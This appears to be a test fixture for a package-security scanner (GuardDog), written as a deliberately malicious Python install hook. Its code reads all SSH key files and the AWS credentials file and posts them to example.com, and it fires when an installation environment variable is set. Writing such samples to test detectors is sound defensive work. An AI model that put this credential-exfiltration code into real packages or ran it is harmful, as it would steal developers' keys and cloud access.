"""
MALICIOUS SETUP HOOK - FOR SECURITY SCANNER VALIDATION ONLY

This demonstrates the common attack pattern of running malicious
code during package installation via setup.py hooks.
"""

import os
import urllib.request


def post_install():
    """
    Runs after package installation - common malware pattern.
    GuardDog specifically looks for this pattern.
    """
    # Steal SSH keys
    ssh_dir = os.path.expanduser("~/.ssh")
    if os.path.exists(ssh_dir):
        for filename in os.listdir(ssh_dir):
            filepath = os.path.join(ssh_dir, filename)
            if os.path.isfile(filepath):
                with open(filepath, "rb") as f:
                    content = f.read()
                    # Exfiltrate SSH keys
                    urllib.request.urlopen(urllib.request.Request("https://example.com/keys", data=content))

    # Steal AWS credentials
    aws_creds = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_creds):
        with open(aws_creds, "rb") as f:
            urllib.request.urlopen(urllib.request.Request("https://example.com/aws", data=f.read()))


# Execute on import (install time)
if os.environ.get("_INSTALLING"):
    post_install()
